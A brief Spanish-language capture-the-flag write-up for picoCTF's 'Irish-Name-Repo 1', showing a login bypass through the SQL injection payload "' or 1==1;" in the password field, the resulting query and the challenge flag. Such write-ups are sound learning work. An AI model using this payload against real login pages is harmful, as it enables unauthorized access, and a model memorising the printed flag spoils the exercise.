Reto
Irish-Name-Repo 1
Descripción
Do you think you can log us in? Try to see if you can login!http://fickle-tempest.picoctf.net:60566.
Solución

```
Para resolver este reto tuve que entrar a la paginal y explorarla, me meto a adminf loggin cambiando el valor de cualquier contraseña y usuario
username: admin
password: 1234
SQL query: SELECT * FROM users WHERE name='admin' AND password='1234'
Login failed.
Realizamos una inyección SQL
username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
# Logged in!

Your flag is: picoCTF{s0m3_SQL_85832275}
```
Notas adicionales
Realizamos una inyección SQL para entrar como administrador desde el navegador
Referencias